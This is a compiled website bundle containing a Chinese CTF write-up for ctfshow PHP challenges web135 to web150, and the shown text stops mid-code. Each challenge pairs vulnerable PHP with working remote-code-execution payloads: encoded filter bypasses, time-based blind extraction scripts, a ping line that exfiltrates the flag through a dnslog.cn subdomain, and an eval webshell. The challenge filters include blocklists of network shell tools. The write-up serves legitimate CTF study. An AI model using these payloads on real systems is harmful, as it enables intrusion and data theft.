"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[472],{6732:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>h,contentTitle:()=>l,default:()=>d,frontMatter:()=>t,metadata:()=>i,toc:()=>p});const i=JSON.parse('{"id":"CTF/CTFSHOW/ctfshowphp\u7279\u60273","title":"ctfshowphp\u7279\u60273","description":"web135(\u65e0\u56de\u663erce\uff0c133plus)","source":"@site/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60273.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshowphp\u7279\u60273","permalink":"/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60273","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60273.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshowphp\u7279\u60272","permalink":"/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60272"},"next":{"title":"ctfshow\u53cd\u5e8f\u5217\u5316","permalink":"/docs/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316"}}');var c=r(4848),s=r(8453);const t={},l=void 0,h={},p=[{value:"web135(\u65e0\u56de\u663erce\uff0c133plus)",id:"web135\u65e0\u56de\u663erce133plus",level:2},{value:"web136(\u65e0\u56de\u663erce)",id:"web136\u65e0\u56de\u663erce",level:2},{value:"web137(call_user_func)",id:"web137call_user_func",level:2},{value:"web138(call_user_func\u4f20\u5165\u6570\u7ec4)",id:"web138call_user_func\u4f20\u5165\u6570\u7ec4",level:2},{value:"web139(136plus\u76f2\u6253)",id:"web139136plus\u76f2\u6253",level:2},{value:"web140(intval\uff0c\u677e\u6563\u6bd4\u8f83)",id:"web140intval\u677e\u6563\u6bd4\u8f83",level:2},{value:"web141(\u6570\u5b57\u548c\u547d\u4ee4\u53ef\u4ee5\u505a\u8fd0\u7b97)",id:"web141\u6570\u5b57\u548c\u547d\u4ee4\u53ef\u4ee5\u505a\u8fd0\u7b97",level:2},{value:"web142",id:"web142",level:2},{value:"web143(\u65e0\u6570\u5b57\u5b57\u6bcdrce)",id:"web143\u65e0\u6570\u5b57\u5b57\u6bcdrce",level:2},{value:"web144(\u65e0\u6570\u5b57\u5b57\u6bcdrce)",id:"web144\u65e0\u6570\u5b57\u5b57\u6bcdrce",level:2},{value:"web145(\u5de7\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\uff0c144plus)",id:"web145\u5de7\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26144plus",level:2},{value:"web146(\u5229\u7528\u4f4d\u8fd0\u7b97\u7b26\uff0c145plus)",id:"web146\u5229\u7528\u4f4d\u8fd0\u7b97\u7b26145plus",level:2},{value:"web147(create_function\u7684\u5229\u7528)",id:"web147create_function\u7684\u5229\u7528",level:2},{value:"web148(\u5229\u7528xor)",id:"web148\u5229\u7528xor",level:2},{value:"web149(\u6761\u4ef6\u7ade\u4e89)",id:"web149\u6761\u4ef6\u7ade\u4e89",level:2},{value:"web150(\u65e5\u5fd7\u5305\u542b)",id:"web150\u65e5\u5fd7\u5305\u542b",level:2},{value:"web150plus(__autoload\u52a0\u8f7d\u672a\u5b9a\u4e49\u7684\u7c7b)",id:"web150plus__autoload\u52a0\u8f7d\u672a\u5b9a\u4e49\u7684\u7c7b",level:2}];function a(n){const e={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...n.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(e.h2,{id:"web135\u65e0\u56de\u663erce133plus",children:"web135(\u65e0\u56de\u663erce\uff0c133plus)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n//flag.php\r\nif($F = @$_GET['F']){\r\n    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){\r\n        eval(substr($F,0,6));\r\n    }else{\r\n        die(\"\u5e08\u5085\u4eec\u5c45\u7136\u7834\u89e3\u4e86\u524d\u9762\u7684\uff0c\u90a3\u5c31\u6765\u4e00\u4e2a\u52a0\u5f3a\u7248\u5427\");\r\n    }\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u6ca1\u6709\u9650\u5236\u5199\u7684\u6743\u9650"}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"F=`$F`;+nl f*>1.txt\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8bbf\u95ee1.txt"}),"\n",(0,c.jsx)(e.p,{children:"\u901a\u8fc7ping\u5f97\u5230flag\uff08\u672a\u5b9e\u73b0\u6210\u529f\uff09"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"payload:F=`$F `;ping `awk '/flag/' flag.php`.1mlbcw.dnslog.cn\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web136\u65e0\u56de\u663erce",children:"web136(\u65e0\u56de\u663erce)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nfunction check($x){\r\n    if(preg_match('/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\?|\\{|\\}|\\>|\\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){\r\n        die('too young too simple sometimes naive!');\r\n    }\r\n}\r\nif(isset($_GET['c'])){\r\n    $c=$_GET['c'];\r\n    check($c);\r\n    exec($c);\r\n}\r\nelse{\r\n    highlight_file(__FILE__);\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u5229\u7528tee\u547d\u4ee4\u5199\u6587\u4ef6"}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"ls | tee 1\r\nls / | tee 2\r\ncat /f149_15_h3r3 | tee 3\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web137call_user_func",children:"web137(call_user_func)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nclass ctfshow\r\n{\r\n    function __wakeup(){\r\n        die("private class");\r\n    }\r\n    static function getFlag(){\r\n        echo file_get_contents("flag.php");\r\n    }\r\n}\r\n\r\ncall_user_func($_POST[\'ctfshow\']); \n'})}),"\n",(0,c.jsx)(e.p,{children:"\u76f4\u63a5\u8c03\u7528\u7c7b\u4e2d\u7684\u65b9\u6cd5"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"ctfshow=ctfshow::getFlag\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u62d3\u5c55"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"php\u4e2d ->\u4e0e:: \u8c03\u7528\u7c7b\u4e2d\u7684\u6210\u5458\u7684\u533a\u522b\r\n->\u7528\u4e8e\u52a8\u6001\u8bed\u5883\u5904\u7406\u67d0\u4e2a\u7c7b\u7684\u67d0\u4e2a\u5b9e\u4f8b\r\n::\u53ef\u4ee5\u8c03\u7528\u4e00\u4e2a\u9759\u6001\u7684\u3001\u4e0d\u4f9d\u8d56\u4e8e\u5176\u4ed6\u521d\u59cb\u5316\u7684\u7c7b\u65b9\u6cd5.\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web138call_user_func\u4f20\u5165\u6570\u7ec4",children:"web138(call_user_func\u4f20\u5165\u6570\u7ec4)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nclass ctfshow\r\n{\r\n    function __wakeup(){\r\n        die("private class");\r\n    }\r\n    static function getFlag(){\r\n        echo file_get_contents("flag.php");\r\n    }\r\n}\r\nif(strripos($_POST[\'ctfshow\'], ":")>-1){\r\n    die("private function");\r\n}\r\ncall_user_func($_POST[\'ctfshow\']);\n'})}),"\n",(0,c.jsx)(e.p,{children:"\u591a\u8fc7\u6ee4\u4e86\u5192\u53f7"}),"\n",(0,c.jsx)(e.p,{children:"call_user_func\u51fd\u6570\u4e0d\u4ec5\u53ef\u4ee5\u4f20\u5165\u5b57\u7b26\u4e32\uff0c\u8fd8\u53ef\u4ee5\u4f20\u5165\u6570\u7ec4"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"call_user_func(array($classname,'getFlag'));\r\n\u53ef\u4ee5\u8c03\u7528classname\u7c7b\u4e2d\u7684getFlag\u65b9\u6cd5\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"ctfshow[0]=ctfshow&ctfshow[1]=getFlag\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web139136plus\u76f2\u6253",children:"web139(136plus\u76f2\u6253)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u6e90\u7801\u4e0e136\u4e00\u6837\uff0c\u4f46\u662f\u9650\u5236\u4e86\u5199\u7684\u6743\u9650\uff0c\u8fd9\u65f6\u5019\u53ef\u4ee5\u8003\u8651\u7528\u76f2\u6253\u7684\u65b9\u5f0f\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u731c\u6d4b\u6587\u4ef6\u540d"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-python",children:'import requests\r\nimport time\r\nimport string\r\n\r\nstr = string.ascii_letters+string.digits+"_"\r\n# print(str)\r\nresult=""\r\nfor i in range(1,5):\r\n\tkey=0\r\n\tfor j in range(1,15):\r\n\t\tif key==\'1\':\r\n\t\t\tbreak\r\n\t\tfor n in str:\r\n\t\t\tpayload="if [ `ls /|awk \'NR=={0}\'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)\r\n\t\t\t# print(payload)\r\n\t\t\turl="http://5aed66c4-83fa-4bb6-804d-ee0846827b8d.challenge.ctf.show/?c="+payload\r\n\t\t\ttry:\r\n\t\t\t\trequests.get(url,timeout=(2.5,2.5))\r\n\t\t\texcept:\r\n\t\t\t    result=result+n\r\n\t\t\t    print(result)\r\n\t\t\t    break\r\n\t\t\tif n==\'_\':\r\n\t\t\t\tkey=1\r\n\tresult+=" "\n'})}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240117192329149.png",alt:"image-20240117192329149"})}),"\n",(0,c.jsx)(e.p,{children:"\u731c\u6d4b\u6587\u4ef6\u5185\u5bb9"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-python",children:'import requests\r\nimport time\r\nimport string\r\n\r\n\r\nstr = string.digits+string.ascii_lowercase+"-"\r\nresult=""\r\nkey=0\r\nfor j in range(1,45):\r\n\t# print(j)\r\n\tif key==1:\r\n\t\tbreak\r\n\tfor n in str:\r\n\t\tpayload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)\r\n\t\t#print(payload) \r\n\t\turl="http://5aed66c4-83fa-4bb6-804d-ee0846827b8d.challenge.ctf.show/?c="+payload\r\n\t\ttry:\r\n\t\t\trequests.get(url,timeout=(2.5,2.5))\r\n\t\texcept:\r\n\t\t    result = result + n\r\n\t\t    print(result)\r\n\t\t    break\n'})}),"\n",(0,c.jsxs)(e.p,{children:["\u56e0\u4e3a","\u88ab\u8fc7\u6ee4\u4e86\uff0c\u5f97\u5230flag\u81ea\u5df1\u6dfb\u52a0\u4e0a\u53bb\u5c31\u884c"]}),"\n",(0,c.jsx)(e.p,{children:"\u62d3\u5c55\uff1a"}),"\n",(0,c.jsx)(e.p,{children:(0,c.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240117192830718.png",alt:"image-20240117192830718"})}),"\n",(0,c.jsx)(e.h2,{id:"web140intval\u677e\u6563\u6bd4\u8f83",children:"web140(intval\uff0c\u677e\u6563\u6bd4\u8f83)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nif(isset($_POST['f1']) && isset($_POST['f2'])){\r\n    $f1 = (String)$_POST['f1'];\r\n    $f2 = (String)$_POST['f2'];\r\n    if(preg_match('/^[a-z0-9]+$/', $f1)){\r\n        if(preg_match('/^[a-z0-9]+$/', $f2)){\r\n            $code = eval(\"return $f1($f2());\");\r\n            if(intval($code) == 'ctfshow'){\r\n                echo file_get_contents(\"flag.php\");\r\n            }\r\n        }\r\n    }\r\n} \n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"intval($code) == 'ctfshow'\r\nintval\u4f1a\u5c06\u975e\u6570\u5b57\u5b57\u7b26\u8f6c\u6362\u62100\r\n\u5982\u679c\u8be5\u5b57\u7b26\u4e32\u4ee5\u5408\u6cd5\u7684\u6570\u503c\u5f00\u59cb\uff0c\u5219\u4f7f\u7528\u8be5\u6570\u503c\uff0c\u5426\u5219\u5176\u503c\u4e3a 0\u30020==0\r\n\u6211\u4eec\u8ba9intval($code)\u4e3a0\u5c31\u53ef\u4ee5\u4e86\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"f1=md5&f2=md5\r\nf1=sha1&f2=sha1\r\nf1=md5&f2=phpinfo\r\n\u8fd8\u6709\u5f88\u591a.......\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web141\u6570\u5b57\u548c\u547d\u4ee4\u53ef\u4ee5\u505a\u8fd0\u7b97",children:"web141(\u6570\u5b57\u548c\u547d\u4ee4\u53ef\u4ee5\u505a\u8fd0\u7b97)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    $v2 = (String)$_GET['v2'];\r\n    $v3 = (String)$_GET['v3'];\r\n\r\n    if(is_numeric($v1) && is_numeric($v2)){\r\n        if(preg_match('/^\\W+$/', $v3)){\r\n            $code =  eval(\"return $v1$v3$v2;\");\r\n            echo \"$v1$v3$v2 = \".$code;\r\n        }\r\n    }\r\n} \n"})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"if(preg_match('/^\\W+$/', $v3)) \u5339\u914d\u6240\u6709\u975e\u5b57\u7b26"}),"\n",(0,c.jsxs)(e.p,{children:["\u5728php\u91cc\uff0c\u6570\u5b57\u662f\u53ef\u4ee5\u548c\u547d\u4ee4\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\u7684\uff0c\u4f8b\u5982 ",(0,c.jsx)(e.code,{children:"1-phpinfo();"}),"\u662f\u53ef\u4ee5\u6267\u884cphpinfo()\u547d\u4ee4\u7684"]}),"\n",(0,c.jsx)(e.p,{children:'eval("1-phpinfo()-1;"); \u4e5f\u53ef\u4ee5\u8fd0\u884cphpinfo\u51fd\u6570'}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"v1=1&v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)-&v2=1\r\n\u53d6\u53cd\u524d:system('cat f*')\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web142",children:"web142"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    if(is_numeric($v1)){\r\n        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);\r\n        sleep($d);\r\n        echo file_get_contents(\"flag.php\");\r\n    }\r\n} \n"})}),"\n",(0,c.jsx)(e.p,{children:"payload:"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"v1=0 //\u516b\u8fdb\u5236\r\nv1=0x0 //\u5341\u516d\u8fdb\u5236\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web143\u65e0\u6570\u5b57\u5b57\u6bcdrce",children:"web143(\u65e0\u6570\u5b57\u5b57\u6bcdrce)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    $v2 = (String)$_GET['v2'];\r\n    $v3 = (String)$_GET['v3'];\r\n    if(is_numeric($v1) && is_numeric($v2)){\r\n        if(preg_match('/[a-z]|[0-9]|\\+|\\-|\\.|\\_|\\||\\$|\\{|\\}|\\~|\\%|\\&|\\;/i', $v3)){\r\n                die('get out hacker!');\r\n        }\r\n        else{\r\n            $code =  eval(\"return $v1$v3$v2;\");\r\n            echo \"$v1$v3$v2 = \".$code;\r\n        }\r\n    }\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u8fc7\u6ee4\u4e86\u53d6\u53cd\u7b26\u53f7\uff0c\u53ef\u4ee5\u8fdb\u884c\u5f02\u6216"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'v1=1&v2=1&v3=/("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")/\n'})}),"\n",(0,c.jsx)(e.h2,{id:"web144\u65e0\u6570\u5b57\u5b57\u6bcdrce",children:"web144(\u65e0\u6570\u5b57\u5b57\u6bcdrce)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    $v2 = (String)$_GET['v2'];\r\n    $v3 = (String)$_GET['v3'];\r\n\r\n    if(is_numeric($v1) && check($v3)){\r\n        if(preg_match('/^\\W+$/', $v2)){\r\n            $code =  eval(\"return $v1$v3$v2;\");\r\n            echo \"$v1$v3$v2 = \".$code;\r\n        }\r\n    }\r\n}\r\n\r\nfunction check($str){\r\n    return strlen($str)===1?true:false;\r\n} \n"})}),"\n",(0,c.jsx)(e.p,{children:"\u540c\u6837\uff0c\u53d6\u53cd\uff0c\u5f02\u6216"}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'v1=1&v3=-&v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)\r\nv1=1&v3=-&v2=("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0b%01%03%00%06%00"^"%7f%60%60%20%60%2a")\n'})}),"\n",(0,c.jsx)(e.h2,{id:"web145\u5de7\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26144plus",children:"web145(\u5de7\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26\uff0c144plus)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    $v2 = (String)$_GET['v2'];\r\n    $v3 = (String)$_GET['v3'];\r\n    if(is_numeric($v1) && is_numeric($v2)){\r\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\r\n                die('get out hacker!');\r\n        }\r\n        else{\r\n            $code =  eval(\"return $v1$v3$v2;\");\r\n            echo \"$v1$v3$v2 = \".$code;\r\n        }\r\n    }\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u52a0\u51cf\u4e58\u9664\u90fd\u88ab\u8fc7\u6ee4\u4e86\uff0c\u53ef\u4ee5\u5229\u7528\u4e09\u76ee\u8fd0\u7b97\u7b26"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'eval("return 1?phpinfo():1;");\n'})}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"v1=1&v3=?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5):&v2=1\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web146\u5229\u7528\u4f4d\u8fd0\u7b97\u7b26145plus",children:"web146(\u5229\u7528\u4f4d\u8fd0\u7b97\u7b26\uff0c145plus)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\nif(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){\r\n    $v1 = (String)$_GET['v1'];\r\n    $v2 = (String)$_GET['v2'];\r\n    $v3 = (String)$_GET['v3'];\r\n    if(is_numeric($v1) && is_numeric($v2)){\r\n        if(preg_match('/[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\}|\\%|\\&|\\;|\\<|\\>|\\*|\\/|\\^|\\#|\\\"/i', $v3)){\r\n                die('get out hacker!');\r\n        }\r\n        else{\r\n            $code =  eval(\"return $v1$v3$v2;\");\r\n            echo \"$v1$v3$v2 = \".$code;\r\n        }\r\n    }\r\n} \n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u5229\u7528\u7b49\u53f7\u548c\u4f4d\u8fd0\u7b97\u7b26 ||\uff0c|"}),"\n"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"v1=1&v2=1&v3===(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5)||\r\nv1=1&v2=1&v3=|(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5)|\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web147create_function\u7684\u5229\u7528",children:"web147(create_function\u7684\u5229\u7528)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\n\r\nif(isset($_POST['ctf'])){\r\n    $ctfshow = $_POST['ctf'];\r\n    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {\r\n        $ctfshow('',$_GET['show']);\r\n    }\r\n\r\n}\n"})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"create_function\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u53c2\u6570\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5185\u5bb9"}),"\n",(0,c.jsx)(e.p,{children:"\u51fd\u6570\u7ed3\u6784\u5f62\u4f3c"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"create_function('$a,$b','return 111')\r\n\r\n==>\r\n\r\nfunction a($a, $b){\r\n    return 111;\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"\u6211\u4eec\u9700\u8981\u8df3\u51fa\u51fd\u6570\u5b9a\u4e49"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"create_function('$a,$b','return 111;}phpinfo();//')\r\n\r\n==>\r\n\r\nfunction a($a, $b){\r\n    return 111;}phpinfo();//\r\n}\n"})}),"\n"]}),"\n",(0,c.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(e.p,{children:"\u4e3a\u4ec0\u4e48\u662f%5c(\\)\uff1f"}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"php\u91cc\u9ed8\u8ba4\u547d\u540d\u7a7a\u95f4\u662f\\\uff0c\u6240\u6709\u539f\u751f\u51fd\u6570\u548c\u7c7b\u90fd\u5728\u8fd9\u4e2a\u547d\u540d\u7a7a\u95f4\u4e2d\u3002 \u666e\u901a\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\uff0c\u5982\u679c\u76f4\u63a5\u5199\u51fd\u6570\u540dfunction_name()\u8c03\u7528\uff0c\u8c03\u7528\u7684\u65f6\u5019\u5176\u5b9e\u76f8\u5f53\u4e8e\u5199\u4e86\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff1b \u800c\u5982\u679c\u5199\\function_name()\u8fd9\u6837\u8c03\u7528\u51fd\u6570\uff0c\u5219\u5176\u5b9e\u662f\u5199\u4e86\u4e00\u4e2a\u7edd\u5bf9\u8def\u5f84\u3002 \u5982\u679c\u4f60\u5728\u5176\u4ed6namespace\u91cc\u8c03\u7528\u7cfb\u7edf\u7c7b\uff0c\u5c31\u5fc5\u987b\u5199\u7edd\u5bf9\u8def\u5f84\u8fd9\u79cd\u5199\u6cd5"}),"\n"]}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"show=;};system('cat flag.php');//\r\nctf=%5ccreate_function\n"})}),"\n",(0,c.jsx)(e.h2,{id:"web148\u5229\u7528xor",children:"web148(\u5229\u7528xor)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\ninclude 'flag.php';\r\nif(isset($_GET['code'])){\r\n    $code=$_GET['code'];\r\n    if(preg_match(\"/[A-Za-z0-9_\\%\\\\|\\~\\'\\,\\.\\:\\@\\&\\*\\+\\- ]+/\",$code)){\r\n        die(\"error\");\r\n    }\r\n    @eval($code);\r\n}\r\nelse{\r\n    highlight_file(__FILE__);\r\n}\r\n\r\nfunction get_ctfshow_fl0g(){\r\n    echo file_get_contents(\"flag.php\");\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload:"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:'\u6ca1\u6709\u8fc7\u6ee4\u5f02\u6216\r\ncode=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");\r\n\u9884\u671f\u89e3\r\ncode=$\u54c8="`{{{"^"?<>/";${$\u54c8}[\u54fc](${$\u54c8}[\u55ef]);&\u54fc=system&\u55ef=tac f*\n'})}),"\n",(0,c.jsx)(e.h2,{id:"web149\u6761\u4ef6\u7ade\u4e89",children:"web149(\u6761\u4ef6\u7ade\u4e89)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:"<?php\r\n$files = scandir('./'); \r\nforeach($files as $file) {\r\n    if(is_file($file)){\r\n        if ($file !== \"index.php\") {\r\n            unlink($file);\r\n        }\r\n    }\r\n}\r\n\r\nfile_put_contents($_GET['ctf'], $_POST['show']);\r\n\r\n$files = scandir('./'); \r\nforeach($files as $file) {\r\n    if(is_file($file)){\r\n        if ($file !== \"index.php\") {\r\n            unlink($file);\r\n        }\r\n    }\r\n}\n"})}),"\n",(0,c.jsx)(e.p,{children:"payload"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u975e\u9884\u671f\u89e3\uff0c\u76f4\u63a5\u5199\u5165index.php\r\nctf=index.php\r\nshow=<?php eval($_POST[1]);?>\n"})}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{children:"\u9884\u671f\u89e3\uff0c\u8fdb\u884c\u6761\u4ef6\u7ade\u4e89\r\nctf=1.php\r\nshow=<?php system('tac /c*');?>\n"})}),"\n",(0,c.jsxs)(e.blockquote,{children:["\n",(0,c.jsx)(e.p,{children:"\u5229\u7528BP\u4e00\u76f4\u4e0a\u4f201.php"}),"\n",(0,c.jsx)(e.p,{children:"\u7136\u540e\u518d\u5f00\u4e00\u4e2a\uff0c\u4e00\u76f4\u8bbf\u95ee1.php"}),"\n"]}),"\n",(0,c.jsx)(e.h2,{id:"web150\u65e5\u5fd7\u5305\u542b",children:"web150(\u65e5\u5fd7\u5305\u542b)"}),"\n",(0,c.jsx)(e.pre,{children:(0,c.jsx)(e.code,{className:"language-php",children:'include("flag.php");\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n\r\nclass CTFSHOW{\r\n    private $username;\r\n    private $password;\r\n    private $vip;\r\n    private $secret;\r\n\r\n    function __construct(){\r\n        $this->vip = 0;\r\n        $this->secret = $flag;\r\n    }\r\n\r\n    function __destruct(){\r\n        echo $this->secret;\r\n    }\r\n\r\n    public function isVIP(){\r\n        return $this->vip?TRUE:FALSE;\r\n        }\r\n    }\r\n\r\n    function __autoload($class){\r\n        if(isset($class)){\r\n            $class();\r\n    }\r\n}\r\n\r\n#\u8fc7\u6ee4\u5b57\u7b26\r\n$key = $_SERVER[\'QUERY_STRING\'];\r\nif(preg_match(\'/\\_| |\\[|\\]|\\?/\', $key)){\r\n    die("error");\r\n}\r\n$ctf = 